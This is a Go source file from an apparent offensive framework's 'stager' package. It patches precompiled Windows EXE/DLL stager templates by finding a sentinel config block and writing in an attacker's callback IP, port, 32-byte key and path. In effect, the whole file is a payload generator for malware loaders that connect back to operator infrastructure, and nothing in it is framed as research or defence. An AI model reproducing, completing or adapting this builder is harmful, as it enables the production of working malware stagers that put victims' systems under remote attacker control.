package stager

// PatchTemplate patches the config block of a precompiled stager template
// (EXE or DLL) in place. Templates embed a placeholder blob whose trailing
// 170-byte config block (magic + ip + port + key + path) carries sentinel
// values; PatchTemplate locates it in the raw binary and overwrites ip/port/
// key/path so payload generation needs no compiler.
//
// The sentinel block is unique within the compiled image: a 170-byte sequence
// starting with the LE "WISP" magic, a fixed 0xCC key and the sentinel path.
// mingw aligns the SC array (NOP padding before it), which does not disturb the
// config region itself.

import (
	"bytes"
	"encoding/binary"
	"fmt"
)

// PatchTemplateBlob is PatchTemplate, but the new config is taken from an
// already-built blob (prologue + stager code + 170-byte config). Useful for
// patching precompiled EXE/DLL templates with a freshly built stage.
func PatchTemplateBlob(tmpl, blob []byte) ([]byte, error) {
	if len(blob) < configSize {
		return nil, fmt.Errorf("stager: blob too short (%d) for config patch", len(blob))
	}
	needle := sentinelNeedle()
	idx := bytes.Index(tmpl, needle)
	if idx < 0 {
		return nil, fmt.Errorf("stager: sentinel config block not found in template")
	}

	out := make([]byte, len(tmpl))
	copy(out, tmpl)
	copy(out[idx:idx+configSize], blob[len(blob)-configSize:])
	return out, nil
}

// Sentinel values baked into the precompiled templates (see
// cmd/gen_stager_templates). Path is NUL-padded to the full 128 bytes.
const (
	SentinelPath = "/WISP_SENTINEL/"
)

// sentinelKey is the 32-byte 0xCC key used in placeholder templates.
func sentinelKey() []byte {
	k := make([]byte, 32)
	for i := range k {
		k[i] = 0xCC
	}
	return k
}

// sentinelNeedle builds the 170-byte config block used in placeholder
// templates (magic WISP LE + ip + port + key + path).
func sentinelNeedle() []byte {
	b := make([]byte, configSize)
	binary.LittleEndian.PutUint32(b[0:4], magicWISP)
	copy(b[4:8], []byte{1, 2, 3, 4}) // 1.2.3.4
	binary.LittleEndian.PutUint16(b[8:10], 0xBEEF)
	copy(b[10:42], sentinelKey())
	copy(b[42:170], []byte(SentinelPath))
	return b
}

// PatchTemplate returns a copy of tmpl with the sentinel config block replaced
// by the given cfg. It errors if the sentinel block cannot be located.
func PatchTemplate(tmpl []byte, cfg Config) ([]byte, error) {
	if len(cfg.IP) != 4 {
		return nil, fmt.Errorf("stager: IPv4 address required (got %q)", cfg.IP)
	}
	if cfg.Port < 1 || cfg.Port > 65535 {
		return nil, fmt.Errorf("stager: invalid port %d", cfg.Port)
	}
	if len(cfg.Key) != 32 {
		return nil, fmt.Errorf("stager: key must be 32 bytes (got %d)", len(cfg.Key))
	}
	if len(cfg.Path) == 0 || len(cfg.Path) > 127 {
		return nil, fmt.Errorf("stager: path must be 1..127 bytes")
	}

	needle := sentinelNeedle()
	idx := bytes.Index(tmpl, needle)
	if idx < 0 {
		return nil, fmt.Errorf("stager: sentinel config block not found in template")
	}

	out := make([]byte, len(tmpl))
	copy(out, tmpl)

	// Write the new config block at the sentinel location.
	off := idx
	binary.LittleEndian.PutUint32(out[off:off+4], magicWISP)
	copy(out[off+4:off+8], cfg.IP)
	binary.LittleEndian.PutUint16(out[off+8:off+10], uint16(cfg.Port))
	copy(out[off+10:off+42], cfg.Key)
	copy(out[off+42:off+170], []byte(cfg.Path))

	return out, nil
}
